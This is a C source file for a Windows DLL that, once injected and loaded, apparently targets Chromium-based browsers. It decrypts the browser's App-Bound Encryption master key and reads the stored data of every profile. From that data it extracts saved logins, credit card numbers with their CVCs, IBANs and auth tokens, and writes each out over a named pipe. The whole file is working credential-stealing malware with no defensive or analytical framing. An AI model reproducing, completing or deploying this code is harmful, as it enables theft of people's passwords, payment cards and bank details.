#include <Windows.h>
#include <ShlObj.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include "Extractor.h"
#include "VFS.h"
#include "Elevator.h"
#include "Decrypt.h"
#include "Memory\Memory.h"
#include "Libs\cJSON.h"
#include "Libs\sqlite3.h"

HANDLE g_pipe = INVALID_HANDLE_VALUE;

void SendPipe(const char* data) {
    if (g_pipe == INVALID_HANDLE_VALUE) return;
    DWORD bytesWritten;
    WriteFile(g_pipe, data, (DWORD)strlen(data), &bytesWritten, 0);
}

void SendPipeFmt(const char* fmt, ...) {
    char buffer[4096];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buffer, sizeof(buffer), fmt, args);
    va_end(args);
    SendPipe(buffer);
}

void GetAppDataPath(char* buffer, DWORD size) {
    PWSTR wPath = 0;
    if (SUCCEEDED(SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, 0, &wPath))) {
        WideCharToMultiByte(CP_UTF8, 0, wPath, -1, buffer, size, 0, 0);
        CoTaskMemFree(wPath);
    }
}

static BOOL CopyFileRetry(const char* src, const char* dest) {
    if (CopyFileA(src, dest, FALSE)) {
        return TRUE;
    }

    HANDLE hSrc = CreateFileA(src, GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    if (hSrc == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hSrc, 0);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hSrc);
        return FALSE;
    }

    BYTE* buffer = (BYTE*)Alloc(fileSize);
    if (!buffer) {
        CloseHandle(hSrc);
        return FALSE;
    }

    DWORD bytesRead;
    BOOL success = ReadFile(hSrc, buffer, fileSize, &bytesRead, 0) && bytesRead == fileSize;
    CloseHandle(hSrc);

    if (!success) {
        Free(buffer);
        return FALSE;
    }

    HANDLE hDest = CreateFileA(dest, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hDest == INVALID_HANDLE_VALUE) {
        Free(buffer);
        return FALSE;
    }

    DWORD bytesWritten;
    success = WriteFile(hDest, buffer, fileSize, &bytesWritten, 0) && bytesWritten == fileSize;
    CloseHandle(hDest);
    Free(buffer);

    return success;
}

void ExtractPasswords(const char* dbPath, const BYTE* masterKey, DWORD masterKeyLen) {
    DbHandle dbHandle = OpenDbMem(dbPath);
    sqlite3_stmt* stmt = 0;
    int rc;

    if (!dbHandle.db) {
        return;
    }

    rc = sqlite3_prepare_v2(dbHandle.db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0);
    if (rc != SQLITE_OK) {
        CloseDb(&dbHandle);
        return;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        const unsigned char* user = sqlite3_column_text(stmt, 1);
        const void* blob = sqlite3_column_blob(stmt, 2);
        int blobLen = sqlite3_column_bytes(stmt, 2);

        if (blob && blobLen > 0) {
            BYTE* plaintext = 0;
            DWORD plaintextLen = 0;
            if (AesGcmDecrypt(masterKey, masterKeyLen, (const BYTE*)blob, blobLen, &plaintext, &plaintextLen, FALSE)) {
                SendPipe("[PASSWORD_START]\n");
                SendPipeFmt("Username: %s\n", user ? (const char*)user : "");
                SendPipeFmt("Password: %.*s\n", plaintextLen, plaintext);
                SendPipeFmt("URL: %s\n", url ? (const char*)url : "");
                SendPipe("[PASSWORD_END]\n");
                Free(plaintext);
            }
        }
    }

    sqlite3_finalize(stmt);
    CloseDb(&dbHandle);
}

void ExtractCards(const char* dbPath, const BYTE* masterKey, DWORD masterKeyLen) {
    DbHandle dbHandle = OpenDbMem(dbPath);
    sqlite3_stmt* stmt = 0;
    sqlite3_stmt* cvcStmt = 0;
    int rc;

    if (!dbHandle.db) {
        return;
    }

    typedef struct {
        char guid[256];
        char value[256];
    } CvcEntry;
    CvcEntry* cvcMap = 0;
    int cvcCount = 0;
    int cvcAlloc = 0;

    if (sqlite3_prepare_v2(dbHandle.db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &cvcStmt, 0) == SQLITE_OK) {
        while (sqlite3_step(cvcStmt) == SQLITE_ROW) {
            const char* guid = (const char*)sqlite3_column_text(cvcStmt, 0);
            const void* blob = sqlite3_column_blob(cvcStmt, 1);
            int len = sqlite3_column_bytes(cvcStmt, 1);
            if (guid && blob && len > 0) {
                BYTE* dec = 0;
                DWORD decLen = 0;
                if (AesGcmDecrypt(masterKey, masterKeyLen, (const BYTE*)blob, len, &dec, &decLen, FALSE)) {
                    if (cvcCount >= cvcAlloc) {
                        cvcAlloc = cvcAlloc ? cvcAlloc * 2 : 16;
                        cvcMap = (CvcEntry*)ReAlloc(cvcMap, cvcAlloc * sizeof(CvcEntry));
                    }
                    if (cvcMap) {
                        strncpy_s(cvcMap[cvcCount].guid, 256, guid, _TRUNCATE);
                        memset(cvcMap[cvcCount].value, 0, 256);
                        if (decLen < 256) {
                            memcpy(cvcMap[cvcCount].value, dec, decLen);
                        }
                        cvcCount++;
                    }
                    Free(dec);
                }
            }
        }
        sqlite3_finalize(cvcStmt);
    }

    rc = sqlite3_prepare_v2(dbHandle.db, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, 0);
    if (rc != SQLITE_OK) {
        if (cvcMap) Free(cvcMap);
        CloseDb(&dbHandle);
        return;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char* guid = (const char*)sqlite3_column_text(stmt, 0);
        const unsigned char* name = sqlite3_column_text(stmt, 1);
        int month = sqlite3_column_int(stmt, 2);
        int year = sqlite3_column_int(stmt, 3);
        const void* blob = sqlite3_column_blob(stmt, 4);
        int blobLen = sqlite3_column_bytes(stmt, 4);

        if (blob && blobLen > 0) {
            BYTE* plaintext = 0;
            DWORD plaintextLen = 0;
            if (AesGcmDecrypt(masterKey, masterKeyLen, (const BYTE*)blob, blobLen, &plaintext, &plaintextLen, FALSE)) {
                const char* cvc = "";
                if (guid) {
                    for (int i = 0; i < cvcCount; i++) {
                        if (strcmp(cvcMap[i].guid, guid) == 0) {
                            cvc = cvcMap[i].value;
                            break;
                        }
                    }
                }
                SendPipe("[CARD_START]\n");
                SendPipeFmt("Name: %s\n", name ? (const char*)name : "");
                SendPipeFmt("Month: %d\n", month);
                SendPipeFmt("Year: %d\n", year);
                SendPipeFmt("Number: %.*s\n", plaintextLen, plaintext);
                SendPipeFmt("CVC: %s\n", cvc);
                SendPipe("[CARD_END]\n");
                Free(plaintext);
            }
        }
    }

    sqlite3_finalize(stmt);
    if (cvcMap) Free(cvcMap);
    CloseDb(&dbHandle);
}

void ExtractIbans(const char* dbPath, const BYTE* masterKey, DWORD masterKeyLen) {
    DbHandle dbHandle = OpenDbMem(dbPath);
    sqlite3_stmt* stmt = 0;
    int rc;

    if (!dbHandle.db) {
        return;
    }

    rc = sqlite3_prepare_v2(dbHandle.db, "SELECT value_encrypted, nickname FROM local_ibans", -1, &stmt, 0);
    if (rc != SQLITE_OK) {
        CloseDb(&dbHandle);
        return;
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const void* blob = sqlite3_column_blob(stmt, 0);
        int blobLen = sqlite3_column_bytes(stmt, 0);
        const unsigned char* nickname = sqlite3_column_text(stmt, 1);

        if (blob && blobLen > 0) {
            BYTE* plaintext = 0;
            DWORD plaintextLen = 0;
            if (AesGcmDecrypt(masterKey, masterKeyLen, (const BYTE*)blob, blobLen, &plaintext, &plaintextLen, FALSE)) {
                SendPipe("[IBAN_START]\n");
                SendPipeFmt("Nickname: %s\n", nickname ? (const char*)nickname : "");
                SendPipeFmt("IBAN: %.*s\n", plaintextLen, plaintext);
                SendPipe("[IBAN_END]\n");
                Free(plaintext);
            }
        }
    }

    sqlite3_finalize(stmt);
    CloseDb(&dbHandle);
}

void ExtractTokens(const char* dbPath, const BYTE* masterKey, DWORD masterKeyLen) {
    DbHandle dbHandle = OpenDbMem(dbPath);
    sqlite3_stmt* stmt = 0;
    int rc;

    if (!dbHandle.db) {
        return;
    }

    rc = sqlite3_prepare_v2(dbHandle.db, "SELECT service, encrypted_token, binding_key FROM token_service", -1, &stmt, 0);
    if (rc != SQLITE_OK) {
        rc = sqlite3_prepare_v2(dbHandle.db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, 0);
        if (rc != SQLITE_OK) {
            CloseDb(&dbHandle);
            return;
        }
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const unsigned char* service = sqlite3_column_text(stmt, 0);
        const void* blob = sqlite3_column_blob(stmt, 1);
        int blobLen = sqlite3_column_bytes(stmt, 1);
        const void* bKeyBlob = 0;
        int bKeyLen = 0;

        if (sqlite3_column_count(stmt) > 2) {
            bKeyBlob = sqlite3_column_blob(stmt, 2);
            bKeyLen = sqlite3_column_bytes(stmt, 2);
        }

        if (blob && blobLen > 0) {
            BYTE* plaintext = 0;
            DWORD plaintextLen = 0;
            if (AesGcmDecrypt(masterKey, masterKeyLen, (const BYTE*)blob, blobLen, &plaintext, &plaintextLen, FALSE)) {
                BYTE* bindingKey = 0;
                DWORD bindingKeyLen = 0;

                if (bKeyBlob && bKeyLen > 0) {
                    AesGcmDecrypt(masterKey, masterKeyLen, (const BYTE*)bKeyBlob, bKeyLen, &bindingKey, &bindingKeyLen, FALSE);
                }

                SendPipe("[TOKEN_START]\n");
                SendPipeFmt("Service: %s\n", service ? (const char*)service : "");
                SendPipeFmt("Token: %.*s\n", plaintextLen, plaintext);
                if (bindingKey) {
                    SendPipeFmt("Binding Key: %.*s\n", bindingKeyLen, bindingKey);
                    Free(bindingKey);
                }
                SendPipe("[TOKEN_END]\n");
                Free(plaintext);
            }
        }
    }

    sqlite3_finalize(stmt);
    CloseDb(&dbHandle);
}

void ProcessProfiles(const BYTE* masterKey, DWORD masterKeyLen) {
    char localAppData[MAX_PATH];
    char userDataPath[MAX_PATH];
    char searchPath[MAX_PATH];
    char loginDataPath[MAX_PATH];
    char loginDataForAccountPath[MAX_PATH];
    char webDataPath[MAX_PATH];
    WIN32_FIND_DATAA findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    GetAppDataPath(localAppData, MAX_PATH);
    snprintf(userDataPath, MAX_PATH, "%s\\%s", localAppData, g_browser.userDataSubPath);
    snprintf(searchPath, MAX_PATH, "%s\\*", userDataPath);

    hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;

            BOOL profileHasData = FALSE;

            snprintf(loginDataPath, MAX_PATH, "%s\\%s\\Login Data", userDataPath, findData.cFileName);
            snprintf(loginDataForAccountPath, MAX_PATH, "%s\\%s\\Login Data For Account", userDataPath, findData.cFileName);
            snprintf(webDataPath, MAX_PATH, "%s\\%s\\Web Data", userDataPath, findData.cFileName);

            BOOL hasLoginData = GetFileAttributesA(loginDataPath) != INVALID_FILE_ATTRIBUTES;
            BOOL hasLoginDataForAccount = GetFileAttributesA(loginDataForAccountPath) != INVALID_FILE_ATTRIBUTES;
            BOOL hasWebData = GetFileAttributesA(webDataPath) != INVALID_FILE_ATTRIBUTES;

            profileHasData = hasLoginData || hasLoginDataForAccount || hasWebData;

            if (profileHasData) {
                SendPipeFmt("[PROFILE_START]%s[PROFILE_END]\n", findData.cFileName);

                if (hasLoginData) {
                    SendPipe("[TYPE_PASSWORDS]\n");
                    ExtractPasswords(loginDataPath, masterKey, masterKeyLen);
                }

                if (hasLoginDataForAccount) {
                    if (!hasLoginData) {
                        SendPipe("[TYPE_PASSWORDS]\n");
                    }
                    ExtractPasswords(loginDataForAccountPath, masterKey, masterKeyLen);
                }

                if (hasWebData) {
                    SendPipe("[TYPE_CARDS]\n");
                    ExtractCards(webDataPath, masterKey, masterKeyLen);
                    SendPipe("[TYPE_IBANS]\n");
                    ExtractIbans(webDataPath, masterKey, masterKeyLen);
                    SendPipe("[TYPE_TOKENS]\n");
                    ExtractTokens(webDataPath, masterKey, masterKeyLen);
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
}

DWORD WINAPI Worker(LPVOID param) {
    BYTE* encKey = 0;
    DWORD encKeyLen = 0;
    BYTE* masterKey = 0;
    DWORD masterKeyLen = 0;

    if (!DetectBrowser()) {
        return 1;
    }

    g_pipe = CreateFileA(
        PIPE_NAME,
        GENERIC_WRITE,
        0,
        0,
        OPEN_EXISTING,
        0,
        0
    );

    if (g_pipe == INVALID_HANDLE_VALUE) return 1;

    if (!GetEncryptedKey(&encKey, &encKeyLen))
	{
        SendPipe("Nenhuma chave App-Bound Encryption encontrada.\n");
        CloseHandle(g_pipe);
        return 1;
    }

    if (!DecryptKey(encKey, encKeyLen, &masterKey, &masterKeyLen))
	{
        SendPipe("Falha ao descriptografar chave.\n");
        Free(encKey);
        CloseHandle(g_pipe);
        return 1;
    }
    Free(encKey);

    ProcessProfiles(masterKey, masterKeyLen);
    Free(masterKey);

    CloseHandle(g_pipe);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(0, 0, Worker, 0, 0, 0);
    }
    return TRUE;
}
